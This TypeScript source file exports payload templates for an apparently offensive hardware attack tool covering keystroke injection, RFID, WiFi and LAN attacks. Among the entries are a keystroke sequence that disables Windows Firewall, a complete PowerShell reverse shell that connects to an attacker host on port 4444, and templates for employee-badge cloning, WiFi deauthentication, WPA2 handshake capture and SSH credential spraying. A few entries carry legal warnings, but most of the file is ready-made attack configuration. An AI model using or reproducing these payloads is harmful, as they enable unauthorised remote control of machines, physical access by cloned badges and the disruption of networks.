// Pre-built payload templates for common attack patterns
export const PAYLOAD_TEMPLATES = {
  hid: {
    "windows-cmd": {
      name: "Windows Command Prompt",
      description: "Opens Windows CMD and executes a command",
      content: {
        sequence: [
          { action: "key", key: "WIN_R", delay: 100 },
          { action: "type", text: "cmd", delay: 100 },
          { action: "key", key: "RETURN", delay: 500 },
          { action: "type", text: "echo Payload executed", delay: 100 },
          { action: "key", key: "RETURN", delay: 100 },
        ],
      },
      metadata: {
        requires: ["Windows OS"],
        riskLevel: 3,
        estimatedTime: "5 seconds",
      },
    },
    "linux-shell": {
      name: "Linux Shell Command",
      description: "Opens shell and executes command on Linux",
      content: {
        sequence: [
          { action: "key", key: "ALT_F2", delay: 100 },
          { action: "type", text: "xterm", delay: 100 },
          { action: "key", key: "RETURN", delay: 500 },
          { action: "type", text: "id", delay: 100 },
          { action: "key", key: "RETURN", delay: 100 },
        ],
      },
      metadata: {
        requires: ["Linux OS"],
        riskLevel: 3,
        estimatedTime: "5 seconds",
      },
    },
    "mac-terminal": {
      name: "macOS Terminal",
      description: "Opens Terminal on macOS and executes command",
      content: {
        sequence: [
          { action: "key", key: "CMD_SPACE", delay: 100 },
          { action: "type", text: "terminal", delay: 100 },
          { action: "key", key: "RETURN", delay: 1000 },
          { action: "type", text: "whoami", delay: 100 },
          { action: "key", key: "RETURN", delay: 100 },
        ],
      },
      metadata: {
        requires: ["macOS"],
        riskLevel: 3,
        estimatedTime: "5 seconds",
      },
    },
    "disable-firewall": {
      name: "Windows Firewall Disable",
      description: "Disables Windows Defender Firewall",
      content: {
        sequence: [
          { action: "key", key: "WIN_R", delay: 100 },
          { action: "type", text: "powershell", delay: 100 },
          { action: "key", key: "RETURN", delay: 500 },
          {
            action: "type",
            text: "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
            delay: 100,
          },
          { action: "key", key: "RETURN", delay: 300 },
        ],
      },
      metadata: {
        requires: ["Windows OS", "Admin Privileges"],
        riskLevel: 5,
        estimatedTime: "8 seconds",
      },
    },
    "reverse-shell": {
      name: "Reverse Shell (Netcat)",
      description:
        "Establishes reverse shell connection (requires nc listenter on attacker machine)",
      content: {
        sequence: [
          { action: "key", key: "WIN_R", delay: 100 },
          { action: "type", text: "powershell", delay: 100 },
          { action: "key", key: "RETURN", delay: 500 },
          {
            action: "type",
            text: "$client = New-Object System.Net.Sockets.TcpClient('attacker.ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            delay: 50,
          },
          { action: "key", key: "RETURN", delay: 100 },
        ],
      },
      metadata: {
        requires: ["Windows PowerShell"],
        riskLevel: 5,
        estimatedTime: "10 seconds",
        warning: "Requires remote listener setup",
      },
    },
  },
  rfid: {
    "clone-tag": {
      name: "Clone RFID Tag",
      description: "Clones data from source to target RFID card",
      content: {
        sourceCard: "UID_PLACEHOLDER",
        targetCard: "UID_PLACEHOLDER",
        protocol: "ISO14443A",
        copyNUID: true,
        copyAllSectors: true,
        keyA: "FFFFFFFFFFFF",
        keyB: "FFFFFFFFFFFF",
      },
      metadata: {
        requires: ["NFC Reader/Writer", "Source & Target Cards"],
        riskLevel: 3,
        estimatedTime: "30 seconds",
      },
    },
    "mifare-classic": {
      name: "MIFARE Classic 1K",
      description: "Standard MIFARE Classic setup and data",
      content: {
        cardType: "MIFARE_CLASSIC_1K",
        sectors: 16,
        blockSize: 4,
        defaultKeyA: "FFFFFFFFFFFF",
        defaultKeyB: "FFFFFFFFFFFF",
        accessBits: "FF078069",
        uidLength: 4,
      },
      metadata: {
        requires: ["NFC Module"],
        riskLevel: 2,
        estimatedTime: "5 seconds",
      },
    },
    "employee-badge": {
      name: "Employee Badge Clone",
      description: "Template for cloning access badge data",
      content: {
        facilityCode: 1,
        cardNumber: 12345,
        format: "H10301",
        dataLength: 26,
        parity: "odd-even",
        description: "Employee ID Badge",
      },
      metadata: {
        requires: ["125kHz Reader/Writer"],
        riskLevel: 4,
        estimatedTime: "10 seconds",
      },
    },
  },
  wifi: {
    "network-scan": {
      name: "Network Scan",
      description: "Scan available WiFi networks",
      content: {
        mode: "scan",
        channels: "1-14",
        scanType: "active",
        timeout: 10000,
        includeHidden: true,
      },
      metadata: {
        requires: ["WiFi Module (ESP32/ESP8266)"],
        riskLevel: 1,
        estimatedTime: "10 seconds",
      },
    },
    "deauth-attack": {
      name: "WiFi Deauthentication Attack",
      description: "Disconnects devices from WiFi network",
      content: {
        targetSSID: "TARGET_NETWORK",
        targetBSSID: "AA:BB:CC:DD:EE:FF",
        channel: 6,
        deauthCount: 100,
        attackDuration: 30000,
      },
      metadata: {
        requires: ["ESP32 in Monitor Mode"],
        riskLevel: 4,
        legal: "Illegal in most countries without authorization",
        estimatedTime: "30 seconds",
      },
    },
    "password-crack": {
      name: "WPA2 Handshake Capture",
      description: "Captures WPA2 handshake for offline cracking",
      content: {
        targetSSID: "TARGET_NETWORK",
        targetBSSID: "AA:BB:CC:DD:EE:FF",
        channel: 6,
        captureTime: 120000,
        method: "monitor-mode",
      },
      metadata: {
        requires: ["Packet Capture Capable Device"],
        riskLevel: 4,
        legal: "Requires explicit authorization",
        estimatedTime: "2-5 minutes",
      },
    },
  },
  lan: {
    "port-scan": {
      name: "Network Port Scan",
      description: "Scans target IP for open ports",
      content: {
        targetIP: "192.168.1.1",
        ports: "1-65535",
        scanType: "tcp-syn",
        timeout: 5000,
      },
      metadata: {
        requires: ["Network Access"],
        riskLevel: 2,
        estimatedTime: "5-30 minutes",
      },
    },
    "service-enumeration": {
      name: "Service Enumeration",
      description: "Identifies services and versions on network",
      content: {
        targetIP: "192.168.1.1",
        scanServices: true,
        versionDetection: true,
        osDetection: true,
      },
      metadata: {
        requires: ["Network Access"],
        riskLevel: 2,
        estimatedTime: "10 minutes",
      },
    },
    "credential-spray": {
      name: "Credential Spray",
      description: "Attempts common credentials against services",
      content: {
        targetService: "ssh",
        targetIP: "192.168.1.100",
        usernames: ["admin", "root", "test"],
        passwords: ["password", "admin", "12345"],
        timeout: 5000,
      },
      metadata: {
        requires: ["Network Access"],
        riskLevel: 3,
        legal: "Requires authorization",
        estimatedTime: "5-10 minutes",
      },
    },
  },
  generic: {
    "blank-template": {
      name: "Blank Custom Payload",
      description: "Empty template for creating custom payloads",
      content: {
        payloadData: {},
        instructions: "Edit this template with your custom data",
      },
      metadata: {
        requires: ["User Implementation"],
        riskLevel: 1,
        estimatedTime: "Variable",
      },
    },
    "javascript-execution": {
      name: "JavaScript Code Execution",
      description: "Execute arbitrary JavaScript code",
      content: {
        language: "javascript",
        code: "console.log('Payload executed successfully');",
        timeout: 5000,
      },
      metadata: {
        requires: ["JavaScript Runtime"],
        riskLevel: 3,
        estimatedTime: "1 second",
      },
    },
  },
};

export function getTemplatesByType(type: string) {
  return PAYLOAD_TEMPLATES[type as keyof typeof PAYLOAD_TEMPLATES] || {};
}

export function getAllTemplates() {
  return PAYLOAD_TEMPLATES;
}

export function getTemplateById(type: string, templateId: string) {
  const templates = getTemplatesByType(type);
  return templates[templateId as keyof typeof templates];
}
